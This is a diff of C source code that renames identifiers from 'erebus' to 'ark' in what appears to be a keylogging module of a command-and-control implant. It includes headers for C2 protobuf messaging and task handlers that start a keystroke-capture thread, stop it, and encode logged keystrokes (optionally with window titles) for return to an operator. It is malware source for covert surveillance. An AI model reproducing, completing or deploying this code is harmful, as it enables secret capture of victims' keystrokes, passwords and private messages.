@@ -5,8 +5,8 @@
 #include <string.h>
 #include <time.h>
 
-#include "erebus/pb_c2.h"
-#include "erebus/pb_wire.h"
+#include "ark/pb_c2.h"
+#include "ark/pb_wire.h"
 
 #define KEYLOG_MAX_ENTRIES 512
 #define KEYLOG_BUF_SIZE    256
@@ -70,22 +70,22 @@ static void keylog_init_once(void) {
     }
 }
 
-int erebus_task_keylog_start(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
+int ark_task_keylog_start(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
     (void)out; (void)out_len;
     keylog_init_once();
     if (g_keylog_running) return 1;
     g_capture_titles = 1;
     if (data_len > 0) {
-        erebus_pb_reader r;
-        erebus_pb_reader_init(&r, data, data_len);
+        ark_pb_reader r;
+        ark_pb_reader_init(&r, data, data_len);
         uint32_t field;
         uint8_t wire;
-        while (erebus_pb_reader_next(&r, &field, &wire)) {
+        while (ark_pb_reader_next(&r, &field, &wire)) {
             if (field == 1 && wire == 0) {
                 uint64_t v;
-                if (erebus_pb_read_varint(&r, &v)) g_capture_titles = (int)v;
+                if (ark_pb_read_varint(&r, &v)) g_capture_titles = (int)v;
             } else {
-                erebus_pb_skip(&r, wire);
+                ark_pb_skip(&r, wire);
             }
         }
     }
@@ -94,7 +94,7 @@ int erebus_task_keylog_start(const uint8_t *data, size_t data_len, uint8_t **out
     return g_keylog_thread != NULL;
 }
 
-int erebus_task_keylog_stop(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
+int ark_task_keylog_stop(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
     (void)data; (void)data_len; (void)out; (void)out_len;
     keylog_init_once();
     if (!g_keylog_running) return 1;
@@ -106,11 +106,11 @@ int erebus_task_keylog_stop(const uint8_t *data, size_t data_len, uint8_t **out,
     return 1;
 }
 
-int erebus_task_keylog_dump(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
+int ark_task_keylog_dump(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
     (void)data; (void)data_len;
     keylog_init_once();
     EnterCriticalSection(&g_keylog_cs);
-    int ok = erebus_pb_encode_keylog_dump_result(g_keylog_entries, g_keylog_count, out, out_len);
+    int ok = ark_pb_encode_keylog_dump_result(g_keylog_entries, g_keylog_count, out, out_len);
     g_keylog_count = 0;
     LeaveCriticalSection(&g_keylog_cs);
     return ok;
